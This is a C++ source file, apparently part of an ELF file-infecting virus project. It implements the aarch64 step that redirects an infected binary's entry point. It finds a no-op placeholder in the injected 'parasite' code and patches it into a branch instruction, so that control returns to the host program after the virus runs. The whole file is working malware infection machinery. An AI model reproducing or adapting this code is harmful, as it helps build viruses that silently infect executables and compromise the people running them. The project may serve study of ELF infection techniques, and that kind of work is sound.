#include "common/patch_pattern.hh"
#include "common/redirect_elf_entry_point.hh"
#include "nostdlib/stdio.hh"

namespace vt::common {

bool redirect_elf_entry_point(
    Elf64_Half binary_type, Elf64_Addr original_entry_point,
    Elf64_Addr parasite_load_address, size_t parasite_offset,
    size_t parasite_size, vt::common::Mmap<PROT_READ | PROT_WRITE>& mapping) {
  constexpr auto no_op_to_be_patched = 0xd503201f;
  // For aarch64, patch the b address to the orignal entry point.
  // It is assumed that the inserted virus has at least 4 bytes of noop and
  // that's where it jumps back to host.

  // b imm26
  // 000101 imm26
  // imm26 = rel / 4
  // The rel is offset from the current instruction (b xxx)
  // The patched jump instruction is always 4 bytes.
  auto patch_offset_from_parasite_start = common::find<uint32_t>(
      mapping.base() + parasite_offset, parasite_size, no_op_to_be_patched);
  if (patch_offset_from_parasite_start == -1) {
    // printf("failed to patch host entry\n");
    return false;
  }
  int32_t rel = 0;
  if (binary_type == ET_EXEC) {
    // for executables, the original entry is the load address, the parasite
    // load address is the new memory address. Use that for offset calculation.
    rel = original_entry_point -
          (parasite_load_address + patch_offset_from_parasite_start);
  } else if (binary_type == ET_DYN) {
    // Both original and parasite offset are relative address to the process
    // start, which is not known until runtime.
    rel = original_entry_point -
          (parasite_offset + patch_offset_from_parasite_start);
  } else {
    CHECK_FAIL();
  }

  rel /= 4;
  auto* inst = (int32_t*)(mapping.mutable_base() + parasite_offset +
                          patch_offset_from_parasite_start);

  *inst = rel;

  *inst &= 0b11111111111111111111111111;
  // fill in op-code
  constexpr auto op_code = 0b00010100000000000000000000000000;

  *inst |= (op_code);

  return true;
}

}  // namespace vt::common